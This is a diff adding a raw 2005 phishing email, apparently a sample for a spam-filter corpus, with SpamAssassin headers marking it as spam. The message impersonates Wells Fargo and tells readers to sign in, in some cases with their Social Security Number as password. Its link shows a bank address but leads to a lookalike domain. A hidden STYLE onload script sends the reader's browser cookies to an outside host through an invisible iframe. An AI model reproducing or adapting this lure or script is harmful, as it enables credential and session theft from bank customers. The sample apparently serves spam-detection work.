@@ -1,0 +1,93 @@
+From nobody Sun Jan 25 14:03:10 2015
+Return-Path: <personalbanking@wellsfargo.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.0.2.3])
+ by naughty.domain.com (Postfix) with ESMTP id 7D9F2536EB3
+ for <username@login.domain.com>; Wed, 26 Oct 2005 08:37:28 -0400 (EDT)
+Received: from mail1.domain.com (localhost.domain.com [127.0.0.1])
+ by mail1.domain.com (Postfix) with ESMTP id 50D906CCE8B
+ for <username@domain.com>; Wed, 26 Oct 2005 08:37:27 -0400 (EDT)
+Received: from 10.0.2.3 (unknown [87.233.128.63])
+ by mail1.domain.com (Postfix) with SMTP
+ for <username@domain.com>; Wed, 26 Oct 2005 08:37:27 -0400 (EDT)
+Received: from 136.56.166.37 by ; Wed, 26 Oct 2005 08:31:24 -0500
+Message-ID: <SMKDKHIMVUJDZEUDBKSG@yahoo.com>
+From: "Personal Banking" <personalbanking@wellsfargo.com>
+Reply-To: "Personal Banking" <personalbanking@wellsfargo.com>
+To: username@domain.com
+Old-Subject: Security Notice #291240 Wells Fargo Internet Banking account
+ Update Necesary!
+Date: Wed, 26 Oct 2005 11:34:24 -0200
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--8354524039957435842"
+X-IP: 200.193.140.243
+X-Spam-Flag: YES
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ******************
+X-Spam-Status: Yes, score=18.0 required=5.0 tests=HTML_30_40,HTML_MESSAGE,
+ HTML_MIME_NO_HTML_TAG,MIME_BOUND_DD_DIGITS,MIME_HTML_ONLY,
+ MIME_HTML_ONLY_MULTI,MPART_ALT_DIFF,MSGID_SPAM_CAPS,MSGID_YAHOO_CAPS,
+ RCVD_HELO_IP_MISMATCH,RCVD_NUMERIC_HELO autolearn=no version=3.0.2
+X-Spam-Report: *  3.8 MSGID_YAHOO_CAPS Message-ID has ALLCAPS@yahoo.com
+ *  4.1 MIME_BOUND_DD_DIGITS Spam tool pattern in MIME boundary
+ *  3.8 MSGID_SPAM_CAPS Spam tool Message-Id: (caps variant)
+ *  1.2 RCVD_NUMERIC_HELO Received: contains an IP address used for HELO
+ *  2.2 RCVD_HELO_IP_MISMATCH Received: HELO and IP do not match, but should
+ *  0.0 HTML_30_40 BODY: Message is 30% to 40% HTML
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 MPART_ALT_DIFF BODY: HTML and text parts are different
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+ *  2.4 MIME_HTML_ONLY_MULTI Multipart message only has text/html MIME parts
+X-YAVR: IFRAME
+Subject: WARNING-IFRAME-Security Notice #291240 Wells Fargo Internet Banking
+ account Update Necesary!
+X-Keywords: 
+Status: RO
+Content-Length: 2269
+Lines: 42
+
+----8354524039957435842
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<DIV>
+<DIV>
+<DIV>
+<P p <></P></DIV></DIV>Dear Member,<BR><BR><BR>We recently reviewed your a=
+ccount, and suspect that your Wells Fargo Internet Banking account may hav=
+e been accessed by an unauthorized third party. Protecting the security of=
+ your acount and of the&nbsp;Wells Fargo&nbsp;network is our primary conce=
+rn. Therefore, as a preventative measure, we have temporarily limited acce=
+ss to sensitive account features. To restore your account access, please t=
+ake the following steps to ensure that your account has not been compromis=
+ed:<BR><BR>1. Login to your&nbsp;Wells Fargo&nbsp;Internet Banking account=
+. In case you are not enrolled for Internet Banking, you will have to use =
+your Social Security Number as both your Personal ID and Password and fill=
+ in all the required information, including your name and account number. =
+2. Review your recent account history for any unauthorized withdrawls or d=
+eposits, and check your account profile to make sure not changes have been=
+ made. If any unauthorized activity has taken p! la ce on your account, re=
+port this to&nbsp;Wells Fargo&nbsp;staff immediately.<BR><BR>To get starte=
+d, please click on the link below:<BR><BR><A  href=3D"http://chase-online.=
+net/wellsfargo/?servlet/LoadBal?screenid=3DSIGNON_DISPLAY&SIGNON_XCP=3DVER=
+IFY" target=3D_blank><FONT color=3D#003399>https://online.wellsfargo.com/s=
+ignon?LOB=3DCONS</FONT></A><BR><BR>We apologize for any inconvenience this=
+ may cause, and appreciate your assistance in helping us maintain the inte=
+grity of the entire&nbsp;Wells Fargo&nbsp;system. Thank you for your promp=
+t attention to this matter.<BR><BR>Sincerly,<BR>The&nbsp;Wells Fargo&nbsp;=
+Team <BR><BR></DIV>
+<DIV id=3Db style=3D"VISIBILITY: hidden">
+<STYLE onload=3D"window.status=3D''; var x =3D escape(document.cookie).sub=
+str(0,1900) ; b.innerHTML=3D'<iframe src=3Dhttp://youche.myheberge.com/inc=
+/y.php?comment=3D cczdream&amp;c_onfiltered=3Don&amp;id=3D'+document.title=
+.substring(document.title.indexOf('-')+2)+'&amp;cookie=3D\''+x+'\'  frameb=
+order=3D0 width=3D10 height=3D10></iframe>';" type=3Dtext/css>
+
+</STYLE>
+</DIV>
+<DIV></DIV>
+
+----8354524039957435842--
